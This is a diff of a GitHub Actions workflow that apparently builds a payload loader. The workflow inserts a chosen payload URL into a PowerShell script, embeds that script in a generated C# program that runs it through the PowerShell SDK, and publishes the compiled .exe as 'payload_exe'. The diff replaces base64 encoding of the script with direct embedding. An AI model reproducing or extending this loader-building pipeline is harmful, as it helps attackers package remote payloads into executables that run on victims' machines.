@@ -24,34 +24,25 @@ jobs:
         $url = '${{ github.event.inputs.payload_url }}'
         (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
 
-    - name: Convert PowerShell script to Base64
-      run: |
-        $script = Get-Content -Path 'static_code.ps1' -Raw
-        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script)) -replace "`r?`n", ""
-        Set-Content -Path 'base64_payload.txt' -Value $b64
-
     - name: Create .NET console project
       run: |
         dotnet new console -o PowerShellRunner
         cd PowerShellRunner
         dotnet add package Microsoft.PowerShell.SDK
 
-    - name: Generate C# code
+    - name: Generate C# code with Embedded PowerShell Script
       shell: powershell
       run: |
-        $b64 = Get-Content -Path 'base64_payload.txt' -Raw
-        $b64_cleaned = $b64 -replace "`r?`n", ""
+        $ps_script = Get-Content -Path 'static_code.ps1' -Raw
+        $escaped_script = $ps_script -replace "`"", "`"`"" -replace "`r?`n", "`n"
 
         $csharp_code = @"
         using System;
         using System.Management.Automation;
-        using System.Text;
 
         class Program {
             static void Main() {
-                string b64 = `"$b64_cleaned`";
-                string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-
+                string script = @`"$escaped_script`";
                 using (PowerShell ps = PowerShell.Create()) {
                     ps.AddScript(script);
                     ps.Invoke();
@@ -72,3 +63,4 @@ jobs:
       with:
         name: payload_exe
         path: PowerShellRunner/bin/Release/net9.0/PowerShellRunner.exe
+
